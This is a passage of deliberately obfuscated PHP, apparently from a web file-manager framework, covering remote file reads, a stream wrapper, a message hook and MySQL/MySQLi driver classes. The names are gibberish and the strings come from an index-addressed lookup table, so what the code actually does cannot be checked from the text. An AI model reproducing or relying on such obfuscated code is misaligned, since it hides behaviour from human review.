$¿­üÛå•[$‹Úñà£œ[32]], $‹Úñà£œ[94] => $£—Í¸§·, $‹Úñà£œ[33] => $‹Úñà£œ[209], $‹Úñà£œ[86] => intval($ÁÌæŸ¾‹), $‹Úñà£œ[184] => get_path_ext($¿­üÛå•[$‹Úñà£œ[32]]), $‹Úñà£œ[1385] => $ÁÌæŸ¾‹ > 0 && $¿­üÛå•[$‹Úñà£œ[1507]], $‹Úñà£œ[1386] => !1); return $‡÷´èŠ; } private function header($ÃİÜîÃ) { $Ê‰¡çâİ =& $_SERVER[ñ÷§¡å]; if (isset(self::$_cacheHeader[$ÃİÜîÃ])) { return self::$_cacheHeader[$ÃİÜîÃ]; } $€É½ÈÆ = isset($GLOBALS[$Ê‰¡çâİ[1508]]) ? $GLOBALS[$Ê‰¡çâİ[1508]] : !1; $GLOBALS[$Ê‰¡çâİ[1508]] = !0; self::$_cacheHeader[$ÃİÜîÃ] = url_header($ÃİÜîÃ); $GLOBALS[$Ê‰¡çâİ[1508]] = $€É½ÈÆ; return self::$_cacheHeader[$ÃİÜîÃ]; } public function hashSimple($Ÿ±èÂ®µ, $…ÁİÔŞÎ = false) { $ˆÇìıª­ =& $_SERVER[ñ÷§¡å]; $ä©›Ù¾Ÿ = $this->info($Ÿ±èÂ®µ); if (!$ä©›Ù¾Ÿ || !$ä©›Ù¾Ÿ[$ˆÇìıª­[211]]) { return !1; } $ïƒßÇÀ = $ä©›Ù¾Ÿ[$ˆÇìıª­[86]]; $”ŸÊàŠ = 200; $–¬ÛÔà‘ = 50; if ($ïƒßÇÀ <= $”ŸÊàŠ * $–¬ÛÔà‘) { return md5($this->fileSubstr($Ÿ±èÂ®µ, 0, $ïƒßÇÀ)) . $ïƒßÇÀ; } $òØ³Ş  = intval($ïƒßÇÀ / $–¬ÛÔà‘); $ª²°«ıŠ = $ˆÇìıª­[12]; $Ÿšç‘æá = timeFloat(); $ôğ¦Â‘ã = 15; for ($´á‚‚Šï = 0; $´á‚‚Šï < $–¬ÛÔà‘; $´á‚‚Šï++) { if (timeFloat() - $Ÿšç‘æá > $ôğ¦Â‘ã) { return !1; } $ÑøÊã¸÷ = $this->fileSubstr($Ÿ±èÂ®µ, $òØ³Ş  * $´á‚‚Šï, $”ŸÊàŠ); if (!$ÑøÊã¸÷) { return !1; } $ª²°«ıŠ .= $ÑøÊã¸÷; } $ª²°«ıŠ .= $this->fileSubstr($Ÿ±èÂ®µ, $ïƒßÇÀ - $”ŸÊàŠ, $”ŸÊàŠ); return md5($ª²°«ıŠ) . $ïƒßÇÀ; } public function getContent($ÖÖğÏ†Ô) { return $this->fileSubstr($ÖÖğÏ†Ô); } public function fileSubstr($ÓıĞ¼î¢, $¥Óˆ±¦ = 0, $¬Ö£ï‚³ = -1) { $Ïå¨ìË  =& $_SERVER[ñ÷§¡å]; $¦’µéùè = $this->info($ÓıĞ¼î¢); if (!$¦’µéùè || !$¦’µéùè[$Ïå¨ìË [211]] && $¦’µéùè[$Ïå¨ìË [86]] > 1024 * 1024 * 10) { return !1; } if ($¬Ö£ï‚³ === -1) { $¬Ö£ï‚³ = $¦’µéùè[$Ïå¨ìË [86]]; } if ($¬Ö£ï‚³ == 0) { return $Ïå¨ìË [12]; } $±ù©æÊ = array($Ïå¨ìË [1509] . $¥Óˆ±¦ . $Ïå¨ìË [795] . ($¥Óˆ±¦ + $¬Ö£ï‚³ - 1)); $°œÑÏû = url_request($ÓıĞ¼î¢, $Ïå¨ìË [240], !1, $±ù©æÊ, !1, !1, 1); return $°œÑÏû[$Ïå¨ìË [1200]] ? $°œÑÏû[$Ïå¨ìË [1200]] : $Ïå¨ìË [12]; } public function download($ŞÔ¤û±™, $ûÖ‡¦¡Š) { Downloader::start($ŞÔ¤û±™, $ûÖ‡¦¡Š); return $ûÖ‡¦¡Š; } } class StreamWrapperIO { private $path; private $info; private $pose = 0; static $_fopenCache = array(); static $_chunkBuffer = array(); private $timeStart = 0; function stream_open($ìĞ¶óµğ, $ °Ûêğ² = '') { $this->info = $this->info($ìĞ¶óµğ); $this->timeStart = timeFloat(); $this->path = $this->info[$_SERVER[ñ÷§¡å][94]]; $this->pathOpen = $ìĞ¶óµğ; if (!$this->info) { return !1; } if (count(self::$_chunkBuffer) > 100) { self::$_chunkBuffer = null; self::$_chunkBuffer = array(); } if (!isset(self::$_chunkBuffer[$ìĞ¶óµğ])) { self::$_chunkBuffer[$ìĞ¶óµğ] = array(); } self::$_fopenCache[$this->pathOpen] = $this; return $this->info ? !0 : !1; } function stream_read($øñ·Úû») { $…¬«˜„ñ = $this->fileSubstr($this->pose, $øñ·Úû»); $this->pose += strlen($…¬«˜„ñ); return $…¬«˜„ñ; } public function stream_tell() { return $this->pose; } public function stream_seek($ÈÙŒáœ, $ ‘Ÿöê) { $€è†ˆÖ =& $_SERVER[ñ÷§¡å]; if ($ ‘Ÿöê == SEEK_SET) { $this->pose = $ÈÙŒáœ; } else { if ($ ‘Ÿöê == SEEK_CUR) { $this->pose += $ÈÙŒáœ; } else { if ($ ‘Ÿöê == SEEK_END) { $this->pose = $this->info[$€è†ˆÖ[86]] + intval($ÈÙŒáœ); } } } if ($ÈÙŒáœ < 0) { $this->pose = $this->info[$€è†ˆÖ[86]] + $ÈÙŒáœ; } return !0; } public function stream_eof() { return $this->pose >= $this->info[$_SERVER[ñ÷§¡å][86]]; } public function stream_close() { unset(self::$_fopenCache[$this->pathOpen]); return !0; } public function url_stat($´²şæşÈ, $´ÜÌ‡¼ç) { $ïó”¬Ø =& $_SERVER[ñ÷§¡å]; $“µúŒ = $this->info($´²şæşÈ); return array($ïó”¬Ø[1510] => 0, $ïó”¬Ø[1511] => 0, $ïó”¬Ø[16] => 32768 + 511, $ïó”¬Ø[1512] => 0, $ïó”¬Ø[1513] => 0, $ïó”¬Ø[1514] => 0, $ïó”¬Ø[1515] => 0, $ïó”¬Ø[86] => $“µúŒ[$ïó”¬Ø[86]], $ïó”¬Ø[1516] => $“µúŒ[$ïó”¬Ø[1384]], $ïó”¬Ø[1472] => $“µúŒ[$ïó”¬Ø[95]], $ïó”¬Ø[1471] => $“µúŒ[$ïó”¬Ø[210]], $ïó”¬Ø[1517] => 0, $ïó”¬Ø[1518] => 0); } static $fileInfo = array(); public function info($Ù¡ü—·) { $Úşûó§ = $_SERVER[ñ÷§¡å][1519]; if (isset(self::$fileInfo[$Ù¡ü—·])) { return self::$fileInfo[$Ù¡ü—·]; } if (substr($Ù¡ü—·, 0, strlen($Úşûó§)) != $Úşûó§) { return !1; } self::$fileInfo[$Ù¡ü—·] = IO::info(substr($Ù¡ü—·, strlen($Úşûó§))); return self::$fileInfo[$Ù¡ü—·]; } public static function read($û¤–¯©, $©‘”¨ , $æˆÇ«Ô) { if (!isset(self::$_fopenCache[$û¤–¯©])) { $¹“·±“­ = new StreamWrapperIO(); $¹“·±“­->stream_open($û¤–¯©); self::$_fopenCache[$û¤–¯©] = $¹“·±“­; } $¹“·±“­ = self::$_fopenCache[$û¤–¯©]; return $¹“·±“­->fileSubstr($©‘”¨ , $æˆÇ«Ô); } public static function _read($Ø÷ïÏš¶, $ñ÷Ä””ë, $óÉœôƒè) { $“™’ŞÛ =& $_SERVER[ñ÷§¡å]; $‰¥¹ş«‹ = fopen($Ø÷ïÏš¶, $“™’ŞÛ[1388]); if (!$‰¥¹ş«‹) { return $“™’ŞÛ[12]; } $íçÔ§ÙÜ = 8192; fseek($‰¥¹ş«‹, $ñ÷Ä””ë, SEEK_SET); $Ê’ê™È = $“™’ŞÛ[12]; $²±ÄµÒ‡ = 0; while ($²±ÄµÒ‡ < $óÉœôƒè) { $¼¼™€ó = min($íçÔ§ÙÜ, $óÉœôƒè - $²±ÄµÒ‡); $Ê’ê™È .= fread($‰¥¹ş«‹, $¼¼™€ó); $²±ÄµÒ‡ += $¼¼™€ó; } fclose($‰¥¹ş«‹); return $Ê’ê™È; } public function fileSubstr($ã´Îöóµ, $Å—şÍè) { $±‹Áî¶™ =& $_SERVER[ñ÷§¡å]; $‘ƒ¿±Ğ = $this->info[$±‹Áî¶™[86]]; $‚¸°Ôß¨ = $ã´Îöóµ; $ˆè„‘†ò = $Å—şÍè; if ($ã´Îöóµ < 0) { $ã´Îöóµ = $‘ƒ¿±Ğ + $ã´Îöóµ; } if ($Å—şÍè === !1) { $Å—şÍè = $‘ƒ¿±Ğ - $ã´Îöóµ; } if ($ã´Îöóµ + $Å—şÍè > $‘ƒ¿±Ğ) { $Å—şÍè = $‘ƒ¿±Ğ - $ã´Îöóµ; } if ($Å—şÍè <= 0) { return $±‹Áî¶™[12]; } if ($ã´Îöóµ < 0 || $ã´Îöóµ >= $‘ƒ¿±Ğ || $Å—şÍè <= 0 || $Å—şÍè > 1024 * 1024 * 10) { throw new Exception("\151\157\x46\151\x6c\145\122\x65\141\x64\40\145\x72\x72\157\x72\41\40\x73\x74\x61\x72\x74\x3d{$ã´Îöóµ}\73\x6c\145\156\147\164\150\75{$Å—şÍè}\x3b\x20\163\151\172\145\x3d{$‘ƒ¿±Ğ}\x3b"); } $šÌíúË¦ = 64 * 1024; $çÉŠÀ› =& self::$_chunkBuffer[$this->path]; if (!$çÉŠÀ›) { $çÉŠÀ› = array(); } $ŞÚ¨Ï‘ò = 0; $‰úşøï = 0; $éÆùÅÙ¥ = $±‹Áî¶™[12]; foreach ($çÉŠÀ› as $ŞÚ¨Ï‘ò => $éÆùÅÙ¥) { $ŞÚ¨Ï‘ò = intval($ŞÚ¨Ï‘ò); $‰úşøï = $ŞÚ¨Ï‘ò + strlen($éÆùÅÙ¥); if ($ã´Îöóµ >= $‰úşøï) { continue; } if ($ã´Îöóµ >= $ŞÚ¨Ï‘ò && $ã´Îöóµ + $Å—şÍè <= $‰úşøï) { return substr($éÆùÅÙ¥, $ã´Îöóµ - $ŞÚ¨Ï‘ò, $Å—şÍè); } break; } if (count($çÉŠÀ›) > 100 || timeFloat() - $this->timeStart > 2.0) { $this->log($±‹Áî¶™[1520], $±‹Áî¶™[1521] . count($çÉŠÀ›) . "\73\x73\x74\x61\162\x74\x3d{$ã´Îöóµ}\x2c\x6c\x65\156\x67\164\x68\x3d{$Å—şÍè}\73\x70\x6f\163\145\x3a{$ŞÚ¨Ï‘ò}\x7e{$‰úşøï}"); throw new Exception($±‹Áî¶™[1522]); } $°ïÑÉøº = intval($ã´Îöóµ / $šÌíúË¦) * $šÌíúË¦; $Òç© šò = ceil(($ã´Îöóµ + $Å—şÍè) / $šÌíúË¦) * $šÌíúË¦ - $°ïÑÉøº; $’¬ÌÊí = IO::fileSubstr($this->path, $°ïÑÉøº, $Òç© šò); $çÉŠÀ›[$°ïÑÉøº . $±‹Áî¶™[12]] = $’¬ÌÊí; ksort($çÉŠÀ›); $²ø³çÙû = substr($’¬ÌÊí, $ã´Îöóµ - $°ïÑÉøº, $Å—şÍè); return $²ø³çÙû; } private function log($éÈÖ®‹ü, $‰ö·¿öû) { $°«±˜õ =& $_SERVER[ñ÷§¡å]; $å®Êº‹Ó = timeFloat() - $this->timeStart; write_log(sprintf($°«±˜õ[1523], $éÈÖ®‹ü, $this->info[$°«±˜õ[32]], $å®Êº‹Ó, $‰ö·¿öû), $°«±˜õ[1190]); } } class Message { function __construct() { } public function send($é´¨öÒë = '', $“·¸á  = array(), $ù”ÈóÙ‚ = "\x74\145\170\164") { $÷Œ®ÒÊ¶ =& $_SERVER[ñ÷§¡å]; $¸™Öá¦¡ = array($÷Œ®ÒÊ¶[33] => $÷Œ®ÒÊ¶[1524], $÷Œ®ÒÊ¶[768] => $é´¨öÒë); if (in_array($ù”ÈóÙ‚, array($÷Œ®ÒÊ¶[1524], $÷Œ®ÒÊ¶[1525]))) { $¸™Öá¦¡[$÷Œ®ÒÊ¶[33]] = $ù”ÈóÙ‚; } $“·¸á  = array($÷Œ®ÒÊ¶[524] => isset($“·¸á [$÷Œ®ÒÊ¶[524]]) ? $“·¸á [$÷Œ®ÒÊ¶[524]] : $÷Œ®ÒÊ¶[12], $÷Œ®ÒÊ¶[609] => isset($“·¸á [$÷Œ®ÒÊ¶[609]]) ? $“·¸á [$÷Œ®ÒÊ¶[609]] : $÷Œ®ÒÊ¶[12]); if (empty($é´¨öÒë) || empty($“·¸á [$÷Œ®ÒÊ¶[524]]) && empty($“·¸á [$÷Œ®ÒÊ¶[609]])) { return !1; } $–½ÀÛ»ï = array($÷Œ®ÒÊ¶[1465] => $¸™Öá¦¡, $÷Œ®ÒÊ¶[1526] => $“·¸á ); Hook::trigger($÷Œ®ÒÊ¶[1527], $–½ÀÛ»ï); } } goto B£É«“…¸Ò; Dè¬ØÇÎêâ: class DbMysql extends Db { public function __construct($ÅşØªç½ = '') { $Ìê€¹ã =& $_SERVER[ñ÷§¡å]; if (!extension_loaded($Ìê€¹ã[817])) { think_exception(think_lang($Ìê€¹ã[14]) . $Ìê€¹ã[892]); } if (!empty($ÅşØªç½)) { $this->config = $ÅşØªç½; if (empty($this->config[$Ìê€¹ã[17]])) { $this->config[$Ìê€¹ã[17]] = $Ìê€¹ã[12]; } } } public function connect($ıÛö¡šÒ = '', $ÄØúİå¿ = 0, $×±ÉèŸ = false) { $„ºè„Ñ¤ =& $_SERVER[ñ÷§¡å]; if (!isset($this->linkID[$ÄØúİå¿])) { if (empty($ıÛö¡šÒ)) { $ıÛö¡šÒ = $this->config; } $¦ÛáÓ·Æ = $ıÛö¡šÒ[$„ºè„Ñ¤[893]] . ($ıÛö¡šÒ[$„ºè„Ñ¤[894]] ? "\x3a{$ıÛö¡šÒ[$„ºè„Ñ¤[894]]}" : $„ºè„Ñ¤[12]); $ËÕ¯…âÒ = !empty($ıÛö¡šÒ[$„ºè„Ñ¤[17]][$„ºè„Ñ¤[18]]) ? $ıÛö¡šÒ[$„ºè„Ñ¤[17]][$„ºè„Ñ¤[18]] : $this->pconnect; if ($ËÕ¯…âÒ) { $this->linkID[$ÄØúİå¿] = mysql_pconnect($¦ÛáÓ·Æ, $ıÛö¡šÒ[$„ºè„Ñ¤[895]], $ıÛö¡šÒ[$„ºè„Ñ¤[896]], 131072); } else { $this->linkID[$ÄØúİå¿] = mysql_connect($¦ÛáÓ·Æ, $ıÛö¡šÒ[$„ºè„Ñ¤[895]], $ıÛö¡šÒ[$„ºè„Ñ¤[896]], !0, 131072); } if (!$this->linkID[$ÄØúİå¿] || !empty($ıÛö¡šÒ[$„ºè„Ñ¤[21]]) && !mysql_select_db($ıÛö¡šÒ[$„ºè„Ñ¤[21]], $this->linkID[$ÄØúİå¿])) { think_exception(mysql_error()); } $ø¼ÏÅ¥  = mysql_get_server_info($this->linkID[$ÄØúİå¿]); mysql_query($„ºè„Ñ¤[897] . think_config($„ºè„Ñ¤[898]) . $„ºè„Ñ¤[58], $this->linkID[$ÄØúİå¿]); if ($ø¼ÏÅ¥  > $„ºè„Ñ¤[899]) { mysql_query($„ºè„Ñ¤[900], $this->linkID[$ÄØúİå¿]); } $this->connected = !0; if (1 != think_config($„ºè„Ñ¤[22])) { unset($this->config); } } return $this->linkID[$ÄØúİå¿]; } public function free() { mysql_free_result($this->queryID); $this->queryID = null; } public function query($³³°»•) { $Á²¤·•Ü =& $_SERVER[ñ÷§¡å]; if (0 === stripos($³³°»•, $Á²¤·•Ü[273])) { $this->close(); $this->connected = !1; } $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $³³°»•; if ($this->queryID) { $this->free(); } think_action_status($Á²¤·•Ü[23], 1); think_status($Á²¤·•Ü[24]); $this->queryID = mysql_query($³³°»•, $this->_linkID); $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = mysql_num_rows($this->queryID); return $this->getAll(); } } public function execute($Øá˜‹ÃÉ) { $ÇÓÆüˆğ =& $_SERVER[ñ÷§¡å]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $Øá˜‹ÃÉ; if ($this->queryID) { $this->free(); } think_action_status($ÇÓÆüˆğ[25], 1); think_status($ÇÓÆüˆğ[24]); $˜¸æÈ•ì = mysql_query($Øá˜‹ÃÉ, $this->_linkID); $this->debug(); if (!1 === $˜¸æÈ•ì) { $this->error(); return !1; } else { $this->numRows = mysql_affected_rows($this->_linkID); $this->lastInsID = mysql_insert_id($this->_linkID); return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { mysql_query($_SERVER[ñ÷§¡å][901], $this->_linkID); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $¼øİòÈ = mysql_query($_SERVER[ñ÷§¡å][902], $this->_linkID); $this->transTimes = 0; if (!$¼øİòÈ) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $„ëöéîÚ = mysql_query($_SERVER[ñ÷§¡å][903], $this->_linkID); $this->transTimes = 0; if (!$„ëöéîÚ) { $this->error(); return !1; } } return !0; } private function getAll() { $ÔÈÚí° = array(); if ($this->numRows > 0) { while ($È¸¿İÁ  = mysql_fetch_assoc($this->queryID)) { $ÔÈÚí°[] = $È¸¿İÁ ; } mysql_data_seek($this->queryID, 0); } return $ÔÈÚí°; } public function getFields($ùÔªÏ´Ã) { $İ±‘‘íù =& $_SERVER[ñ÷§¡å]; $…Ìæ½­Ú = $this->query($İ±‘‘íù[904] . $this->parseKey($ùÔªÏ´Ã)); $«šöÃ¼È = array(); if ($…Ìæ½­Ú) { foreach ($…Ìæ½­Ú as $¡·ê´¿Œ => $¾Êğ¢°) { $«šöÃ¼È[$¾Êğ¢°[$İ±‘‘íù[31]]] = array($İ±‘‘íù[32] => $¾Êğ¢°[$İ±‘‘íù[31]], $İ±‘‘íù[33] => $¾Êğ¢°[$İ±‘‘íù[34]], $İ±‘‘íù[35] => (bool) (strtoupper($¾Êğ¢°[$İ±‘‘íù[36]]) === $İ±‘‘íù[905]), $İ±‘‘íù[37] => $¾Êğ¢°[$İ±‘‘íù[38]], $İ±‘‘íù[39] => strtolower($¾Êğ¢°[$İ±‘‘íù[40]]) == $İ±‘‘íù[41], $İ±‘‘íù[42] => strtolower($¾Êğ¢°[$İ±‘‘íù[43]]) == $İ±‘‘íù[44]); } } return $«šöÃ¼È; } public function getTables($ñÉ´ÄéÜ = '') { $·Œ¯Š°¥ =& $_SERVER[ñ÷§¡å]; if (!empty($ñÉ´ÄéÜ)) { $¡˜Ò†“ = $·Œ¯Š°¥[906] . $ñÉ´ÄéÜ . $·Œ¯Š°¥[907]; } else { $¡˜Ò†“ = $·Œ¯Š°¥[908]; } $çé¿Œ¹ó = $this->query($¡˜Ò†“); $×ç–Õï— = array(); foreach ($çé¿Œ¹ó as $×ÚÏšıÌ => $Ÿõ¬£ã°) { $×ç–Õï—[$×ÚÏšıÌ] = current($Ÿõ¬£ã°); } return $×ç–Õï—; } public function replace($ÔîÊò±µ, $§®ĞÉù£ = array()) { $ÜØ’²Â =& $_SERVER[ñ÷§¡å]; foreach ($ÔîÊò±µ as $¨¬ıµÓÜ => $×›¡ñ¯¯) { $ôÍûÇ’ = $this->parseValue($×›¡ñ¯¯); if (is_scalar($ôÍûÇ’)) { $²•©³ù[] = $ôÍûÇ’; $¥÷³Æ…´[] = $this->parseKey($¨¬ıµÓÜ); } } $ÀŞ«ÓÙ¾ = $ÜØ’²Â[909] . $this->parseTable($§®ĞÉù£[$ÜØ’²Â[288]]) . $ÜØ’²Â[910] . implode($ÜØ’²Â[50], $¥÷³Æ…´) . $ÜØ’²Â[911] . implode($ÜØ’²Â[50], $²•©³ù) . $ÜØ’²Â[912]; return $this->execute($ÀŞ«ÓÙ¾); } public function insertAll($âªÊÎèÕ, $‘ÊØÀŸš = array(), $ˆ¯½Ğ»Ä = false) { $£ğ£ÆÖÑ =& $_SERVER[ñ÷§¡å]; if (!is_array($âªÊÎèÕ[0])) { return !1; } $‹•ôİÍµ = array_keys($âªÊÎèÕ[0]); $Â¹­ä…å = array(); foreach ($âªÊÎèÕ as $Û™óÑ™¼) { $íŸõÅÄì = array(); foreach ($Û™óÑ™¼ as $şÕÛÂË => $éò“ú÷˜) { $éò“ú÷˜ = $this->parseValue($éò“ú÷˜); if (is_scalar($éò“ú÷˜)) { $íŸõÅÄì[] = $éò“ú÷˜; } } $Â¹­ä…å[] = $£ğ£ÆÖÑ[269] . implode($£ğ£ÆÖÑ[50], $íŸõÅÄì) . $£ğ£ÆÖÑ[912]; } array_walk($‹•ôİÍµ, array($this, $£ğ£ÆÖÑ[913])); $½ÀÓÅ¡ = ($ˆ¯½Ğ»Ä ? $£ğ£ÆÖÑ[914] : $£ğ£ÆÖÑ[915]) . $£ğ£ÆÖÑ[916] . $this->parseTable($‘ÊØÀŸš[$£ğ£ÆÖÑ[288]]) . $£ğ£ÆÖÑ[910] . implode($£ğ£ÆÖÑ[50], $‹•ôİÍµ) . $£ğ£ÆÖÑ[917] . implode($£ğ£ÆÖÑ[50], $Â¹­ä…å); return $this->execute($½ÀÓÅ¡); } public function close() { if ($this->_linkID) { mysql_close($this->_linkID); } $this->_linkID = null; } public function error() { $Ò³§ıâé =& $_SERVER[ñ÷§¡å]; $this->error = mysql_errno() . $Ò³§ıâé[4] . mysql_error($this->_linkID); if ($Ò³§ıâé[12] != $this->queryStr) { $this->error .= LNG($Ò³§ıâé[48]) . $this->queryStr; } think_trace($this->error, $Ò³§ıâé[12], $Ò³§ıâé[49]); return $this->error; } public function escapeString($±è¾ûå›) { if ($this->_linkID) { return mysql_real_escape_string($±è¾ûå›, $this->_linkID); } else { return mysql_escape_string($±è¾ûå›); } } public function parseKey(&$ÄıëÅé×, $•Ã¼Àğñ = true) { $áœêÀ†Â =& $_SERVER[ñ÷§¡å]; if ($•Ã¼Àğñ) { $ÄıëÅé× = $this->parseKeyCheck($ÄıëÅé×); } if ($ÄıëÅé× != $áœêÀ†Â[198] && !preg_match($áœêÀ†Â[918], $ÄıëÅé×)) { $ÄıëÅé× = $áœêÀ†Â[394] . trim($ÄıëÅé×, $áœêÀ†Â[394]) . $áœêÀ†Â[394]; } return $ÄıëÅé×; } } class DbMysqli extends Db { public function __construct($ÇŸ¨Şî = '') { $²÷Û‡£ =& $_SERVER[ñ÷§¡å]; if (!extension_loaded($²÷Û‡£[919])) { think_exception(think_lang($²÷Û‡£[14]) . $²÷Û‡£[920]); } if (!empty($ÇŸ¨Şî)) { $this->config = $ÇŸ¨Şî; if (empty($this->config[$²÷Û‡£[17]])) { $this->config[$²÷Û‡£[17]] = $²÷Û‡£[12]; } } } public function connect($£–•Ôş· = '', $…çúÀ‰ = 0) { $Ìè¯‰æ© =& $_SERVER[ñ÷§¡å]; if (!isset($this->linkID[$…çúÀ‰])) { if (empty($£–•Ôş·)) { $£–•Ôş· = $this->config; } $this->linkID[$…çúÀ‰] = new mysqli($£–•Ôş·[$Ìè¯‰æ©[893]], $£–•Ôş·[$Ìè¯‰æ©[895]], $£–•Ôş·[$Ìè¯‰æ©[896]], $£–•Ôş·[$Ìè¯‰æ©[21]], $£–•Ôş·[$Ìè¯‰æ©[894]] ? intval($£–•Ôş·[$Ìè¯‰æ©[894]]) : 3306); if (mysqli_connect_errno()) { think_exception(mysqli_connect_error()); } $è®şÀÑ„ = $this->linkID[$…çúÀ‰]->server_version; $this->linkID[$…çúÀ‰]->query($Ìè¯‰æ©[897] . think_config($Ìè¯‰æ©[898]) . $Ìè¯‰æ©[58]); if ($è®şÀÑ„ > $Ìè¯‰æ©[899]) { $this->linkID[$…çúÀ‰]->query($Ìè¯‰æ©[900]); } $this->connected = !0; if (1 != think_config($Ìè¯‰æ©[22])) { unset($this->config); } } return $this->linkID[$…çúÀ‰]; } public function free() { $this->queryID->free_result(); $this->queryID = null; } public function query($ÆÆş‹ïÅ) { $£¦ôƒü» =& $_SERVER[ñ÷§¡å]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $ÆÆş‹ïÅ; if ($this->queryID) { $this->free(); } think_action_status($£¦ôƒü»[23], 1); think_status($£¦ôƒü»[24]); $this->queryID = $this->_linkID->query($ÆÆş‹ïÅ); if ($this->_linkID->more_results()) { while (($ı»æàÆ = $this->_linkID->next_result()) != NULL) { $ı»æàÆ->free_result(); } } $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = $this->queryID->num_rows; $this->numCols = $this->queryID->field_count; return $this->getAll(); } } public function execute($ÈÉûµÜ¹) { $Áıì¨š =& $_SERVER[ñ÷§¡å]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $ÈÉûµÜ¹; if ($this->queryID) { $this->free(); } think_action_status($Áıì¨š[25], 1); think_status($Áıì¨š[24]); $Ïğ¬®ˆ = $this->_linkID->query($ÈÉûµÜ¹); $this->debug(); if (!1 === $Ïğ¬®ˆ) { $this->error(); return !1; } else { $this->numRows = $this->_linkID->affected_rows; $this->lastInsID = $this->_linkID->insert_id; return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if ($this->transTimes == 0) { $this->_linkID->autocommit(!1); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $¾© «ã = $this->_linkID->commit(); $this->_linkID->autocommit(!0); $this->transTimes = 0; if (!$¾© «ã) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $¸Ö²àùè = $this->_linkID->rollback(); $this->transTimes = 0; if (!$¸Ö²àùè) { $this->error(); return !1; } } return !0; } private function getAll() { $“òÄ¿Ä§ = array(); if ($this->numRows > 0) { for ($¢ÅÄüï = 0; $¢ÅÄüï < $this->numRows; $¢ÅÄüï++) { $“òÄ¿Ä§[$¢ÅÄüï] = $this->queryID->fetch_assoc(); } $this->queryID->data_seek(0); } return $“òÄ¿Ä§; } public function getFields($•ˆ·) { $ºÍÈ—÷„ =& $_SERVER[ñ÷§¡å]; $Ç€»×‚ = $this->query($ºÍÈ—÷„[904] . $this->parseKey($•ˆ·)); $çÀŒé¢¸ = array(); if ($Ç€»×‚) { foreach ($Ç€»×‚ as $é¿ƒÙ¸ => $×Ë˜Ôè) { $çÀŒé¢¸[$×Ë˜Ôè[$ºÍÈ—÷„[31]]] = array($ºÍÈ—÷„[32] => $×Ë˜Ôè[$ºÍÈ—÷„[31]], $ºÍÈ—÷„[33] => $×Ë˜Ôè[$ºÍÈ—÷„[34]], $ºÍÈ—÷„[35] => (bool) ($×Ë˜Ôè[$ºÍÈ—÷„[36]] === $ºÍÈ—÷„[12]), $ºÍÈ—÷„[37] => $×Ë˜Ôè[$ºÍÈ—÷„[38]], $ºÍÈ—÷„[39] => strtolower($×Ë˜Ôè[$ºÍÈ—÷„[40]]) == $ºÍÈ—÷„[41], $ºÍÈ—÷„[42] => strtolower($×Ë˜Ôè[$ºÍÈ—÷„[43]]) == $ºÍÈ—÷„[44]); } } return $çÀŒé¢¸; } public function getTables($ÒÌäü³Ó = '') { $òÒµ§Ô± =& $_SERVER[ñ÷§¡å]; $¥×÷â‹ = !empty($ÒÌäü³Ó) ? $òÒµ§Ô±[906] . $ÒÌäü³Ó . $òÒµ§Ô±[907] : $òÒµ§Ô±[908]; $ÂÇ«“º· = $this->query($¥×÷â‹); $–ë¯üË¦ = array(); if ($ÂÇ«“º·) { foreach ($ÂÇ«“º· as $úÖ¡ˆã€ => $™÷ôì°) { $–ë¯üË¦[$úÖ¡ˆã€] = current($™÷ôì°); } } return $–ë¯üË¦; } public function replace($¶¥û£‰», $ˆ×¬°Èƒ = array()) { $Å›¥âû =& $_SERVER[ñ÷§¡å]; foreach ($¶¥û£‰» as $ˆ¤ ×ËÉ => $†Ç§‘ªã) { $Ê·°ß¨° = $this->parseValue($†Ç§‘ªã); if (is_scalar($Ê·°ß¨°)) { $ùªšÃ©Ì[] = $Ê·°ß¨°; $æÌæœéó[] = $this->parseKey($ˆ¤ ×ËÉ); } } $¼¸”úÜ¶ = $Å›¥âû[909] . $this->parseTable($ˆ×¬°Èƒ[$Å›¥âû[288]]) . $Å›¥âû[910] . implode($Å›¥âû[50], $æÌæœéó) . $Å›¥âû[911] . implode($Å›¥âû[50], $ùªšÃ©Ì) . $Å›¥âû[912]; return $this->execute($¼¸”úÜ¶); } public function insertAll($é•İº†©, $¢é¥®ü = array(), $¿È€ÒÃ• = false) { $‚öĞÛŒ =& $_SERVER[ñ÷§¡å]; if (!is_array($é•İº†©[0])) { return !1; } $„Šöı¡º = array_keys($é•İº†©[0]); $ÚÁáŞ = array(); foreach ($é•İº†© as $’©áæÁ°) { $êã®È™² = array(); foreach ($’©áæÁ° as $¡èˆëÜÀ => $ò’›¸èÎ) { $ò’›¸èÎ = $this->parseValue($ò’›¸èÎ); if (is_scalar($ò’›¸èÎ)) { $êã®È™²[] = $ò’›¸èÎ; } } $ÚÁáŞ[] = $‚öĞÛŒ[269] . implode($‚öĞÛŒ[50], $êã®È™²) . $‚öĞÛŒ[912]; } array_walk($„Šöı¡º, array($this, $‚öĞÛŒ[913])); $ıïğ—­Å = $¿È€ÒÃ• ? $‚öĞÛŒ[914] : $‚öĞÛŒ[915]; $Üş¤şÕš = $ıïğ—­Å . $‚öĞÛŒ[916] . $this->parseTable($¢é¥®ü[$‚öĞÛŒ[288]]) . $‚öĞÛŒ[910] . implode($‚öĞÛŒ[50], $„Šöı¡º) . $‚öĞÛŒ[917] . implode($‚öĞÛŒ[50], $ÚÁáŞ); return $this->execute($Üş¤şÕš); } public function close() { if ($this->_linkID) { $this->_linkID->close(); } $this->_linkID = null; } public function error() { $€Î±ÅÖĞ =& $_SERVER[ñ÷§¡å]; $this->error = $this->_linkID->errno . $€Î±ÅÖĞ[4] . $this->_linkID->error; if ($€Î±ÅÖĞ[12] != $this->queryStr) { $this->error .= LNG($€Î±ÅÖĞ[48]) . $this->queryStr; } think_trace($this->error, $€Î±ÅÖĞ[12], 